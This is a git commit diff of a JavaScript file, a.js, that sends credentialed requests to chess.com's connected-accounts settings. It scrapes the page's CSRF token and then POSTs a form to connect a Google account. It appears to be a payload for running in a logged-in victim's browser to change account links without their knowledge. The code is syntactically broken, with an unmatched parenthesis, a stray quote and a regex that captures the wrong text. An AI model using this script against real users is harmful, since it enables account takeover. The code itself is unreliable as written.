a9c9ceda5eb1dee52f16f134071d9918c5bc096e
yellowrook1 <95589375+yellowrook1@users.noreply.github.com>
2021-12-08 15:13:35 -0500

    Update a.js

--- a.js
+++ a.js
@@ -1,10 +1,19 @@
 fetch("https://www.chess.com/settings/connected-accounts", {
-  "headers": {
-    "content-type": "application/x-www-form-urlencoded",
-  },
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "form%5Bconnect_google%5D=&form%5B_token%5D=kakaOOc1wx1zr1uS2aX27YXzG-k3vj4TDgAP3U95KLY",
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-});
+        "referrerPolicy": "strict-origin-when-cross-origin",
+        "method": "GET",
+        "mode": "cors",
+        "credentials": "include"
+    }).then((response) => response.text())
+    .then((text) => {
+            var token = text.match(/("token":".+?)["]/)[1]); 
+            fetch("https://www.chess.com/settings/connected-accounts", {
+            "headers": {
+                "content-type": "application/x-www-form-urlencoded",
+            },
+            "referrerPolicy": "strict-origin-when-cross-origin",
+            "body": "form[connect_google]=&form[_token]=" + token",
+            "method": "POST",
+            "mode": "cors",
+            "credentials": "include"
+        });
+    });
